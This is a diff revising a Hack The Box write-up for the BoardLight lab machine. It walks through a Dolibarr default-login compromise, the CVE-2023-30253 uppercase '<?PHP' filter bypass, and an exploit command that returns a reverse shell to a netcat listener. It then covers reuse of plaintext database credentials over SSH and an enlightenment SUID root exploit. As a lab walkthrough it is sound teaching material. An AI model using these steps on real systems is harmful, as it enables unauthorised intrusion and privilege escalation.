@@ -1,17 +1,21 @@
 ---
 title: "BoardLight Writeup"
-date: 2024-08-12T19:52:13-07:00
+date: 2024-09-29
 tags: ["Hack The Box", "Writeup"]
 toc: true
-description: "BoardLight is a Hack the Box virtual machine that was released on May 25, 2024. It is an easy linux machine."
-draft: true
+description: "BoardLight is an easy difficulty Linux machine that features a `Dolibarr` instance vulnerable to CVE-2023-30253." 
+draft: false
 image: "images/BoardLight.png"
 style: ""
 ---
 
 ## Introduction
 
-[BoardLight](https://app.hackthebox.com/machines/BoardLight) is a Hack the Box virtual machine that was released on May 25, 2024. It is an easy linux machine.
+From Hack The Box:
+
+> [BoardLight](https://app.hackthebox.com/machines/BoardLight) is an easy difficulty Linux machine that features a `Dolibarr` instance vulnerable to [CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253). This vulnerability is leveraged to gain access as `www-data`. After enumerating and dumping the web configuration file contents, plaintext credentials lead to `SSH` access to the machine. Enumerating the system, a `SUID` binary related to `enlightenment` is identified which is vulnerable to privilege escalation via [CVE-2022-37706]( https://nvd.nist.gov/vuln/detail/CVE-2022-37706) and can be abused to leverage a root shell. 
+
+The machine was released on May 25, 2024. I completed the machine on July 14, 2024.
 
 <!--more-->
 
@@ -19,7 +23,7 @@ style: ""
 
 Start with a nmap scan:
 
-```Bash
+```console
 ┌─[eclectic@parrot]─[~]
 └──╼ $sudo nmap -sC -sV 10.10.11.11
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 16:36 PDT
@@ -45,7 +49,7 @@ Visiting the website shows a normal looking business page. There are some input 
 
 We do see the email of the company at the footer of the page: `info@board.htb`. I add the domain `board.htb` to `/etc/hosts` and I try a subdomain scan:
 
-```Bash
+```console
 ┌─[eclectic@parrot]─[~]
 └──╼ $gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://board.htb
 ===============================================================
@@ -75,7 +79,9 @@ Lets add this to `/etc/hosts` with `echo "10.10.11.11 crm.board.htb" | sudo tee 
 
 Visiting the link shows a login page for `Dolibarr`: 
 
-![](BoardLight_Dolibarr_Login.png)
+![](images/BoardLight_Dolibarr_Login.png)
+
+## Foothold
 
 From [Wikipedia](https://en.wikipedia.org/wiki/Dolibarr):
 
@@ -83,15 +89,25 @@ From [Wikipedia](https://en.wikipedia.org/wiki/Dolibarr):
 
 I look up online for default credentials for Dolibarr, and I come across [this Dolibarr forum post](https://www.dolibarr.org/forum/t/login-after-installation/16088), which links to [this Dolibarr github issue](https://github.com/Dolibarr/dolibarr/issues/6568). The default credentials for a Dolibarr instance on Docker is `admin/admin`. Inputting these credentials logs me in as Admin. Success!
 
-https://www.swascan.com/security-advisory-dolibarr-17-0-0/
 
-Doing some research reveals a PHP exploitation in Dolibarr.
+Doing some research reveals a [PHP exploitation in Dolibarr](https://www.swascan.com/security-advisory-dolibarr-17-0-0/). In the webpage editor, if you input php code without holding permissions to do so, Dolibarr will throw an error and forbid you from saving the code. *But*, if you format the php code as 
 
-(explain exploit here)
+```php
+<?PHP  ?>
+```
 
-I found a python script that will automatically deploy a reverse shell on Dolibarr [here](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py). 
+instead of
 
-```Bash
+```php
+<?php ?>
+```
+
+Dolibarr will accept this, mistaking it for some other type of code. Any character in uppercase will work for this.
+
+
+Now that I can add php code to the webpage, I can inject a reverse shell into the server to gain access. I found a python script that will automatically deploy a reverse shell on Dolibarr [here](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py). 
+
+```console
 ┌─[eclectic@parrot]─[~/Downloads]
 └──╼ $python exploit.py http://crm.board.htb admin admin 10.10.16.2 1234
 [*] Trying authentication...
@@ -103,7 +119,7 @@ I found a python script that will automatically deploy a reverse shell on Doliba
 
 ```
 
-```Bash
+```console
 ┌─[✗]─[eclectic@parrot]─[~]
 └──╼ $nc -lnvp 1234
 listening on [any] 1234 ...
@@ -124,7 +140,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
 ```
 
-Now I have to look around.
+Now I have to find a way to gain more privileges, likely through logging in as a different user.
 
 In the `/html/crm.board.htb/htdocs/conf` directory, there are plaintext credentials for the dolibarr database:
 
@@ -180,9 +196,11 @@ $dolibarr_mailing_limit_sendbycli='0';
 $dolibarr_main_distrib='standard';
 ```
 
+### mysql
+
 We can try to log into the sql database with `mysql`:
 
-```Bash
+```console
 <rm.board.htb/htdocs/conf$ mysql -u dolibarrowner -p  
 Enter password: serverfun2$2023!!
 
@@ -203,16 +221,13 @@ mysql>
 
 We find a `llx_user` table, but the rows have the passwords hashed. `hash-identifier` does not find any matches, so we may have to come back to this.
 
+### ssh
+
 I do recall a `ssh` server running. We could try this credential for the `larissa` user:
 
-```Bash
+```console
 ┌─[✗]─[eclectic@parrot]─[~/Downloads]
 └──╼ $ssh 10.10.11.11 -l larissa
-The authenticity of host '10.10.11.11 (10.10.11.11)' can't be established.
-ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.11.11' (ED25519) to the list of known hosts.
 larissa@10.10.11.11's password: 
 
 The programs included with the Ubuntu system are free software;
@@ -227,7 +242,9 @@ larissa@boardlight:~$
 
 Bingo. Remember: never reuse your passwords, kids.
 
-```Bash
+## Privilege Escalation
+
+```console
 larissa@boardlight:~$ ls
 Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
 larissa@boardlight:~$ 
@@ -235,12 +252,14 @@ larissa@boardlight:~$
 
 Checking our `id`:
 
-```Bash
+```console
 larissa@boardlight:~$ id
 uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
 ```
 
-```Bash
+We can use the following command to find SUID/GUID files, or files that we have special permission to run:
+
+```console
 larissa@boardlight:~$ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/xorg/Xorg.wrap
@@ -266,10 +285,11 @@ larissa@boardlight:~$
 
 ```
 
-The enlightenment program has an [privilege escalation exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh). Copy the exploit shell and run it:
+One of these files is the `enlightenment` program. Doing some searching on this program reveals a [privilege escalation exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh). Copy the exploit shell and run it:
 
-```Bash
+```console
 larissa@boardlight:~$ vi exploit.sh
+[INSERT THE EXPLOIT IN VI]
 larissa@boardlight:~$ bash exploit.sh
 CVE-2022-37706
 [*] Trying to find the vulnerable SUID file...
@@ -285,7 +305,7 @@ root
 # 
 ```
 
-```Bash
+```console
 # cd /
 # ls
 bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media	mnt  opt  proc	root  run  sbin  srv  sys  tmp	usr  var
@@ -295,11 +315,10 @@ root.txt  snap
 # 
 ```
 
-
-note: https://medium.com/@h4s7ur/hack-the-box-boardlight-walkthrough-0d33b192142a this write up was used to help point me in the right direction when I got stuck.
-
 ## Pwned
 
 ![](images/pwned.png "Boardlight Pwned")
 
+## Credit
 
+Credit to `h4stur` on Medium for some help on Privilege Escalation. `h4stur`'s write-up is [here.](https://medium.com/@h4s7ur/hack-the-box-boardlight-walkthrough-0d33b192142a)
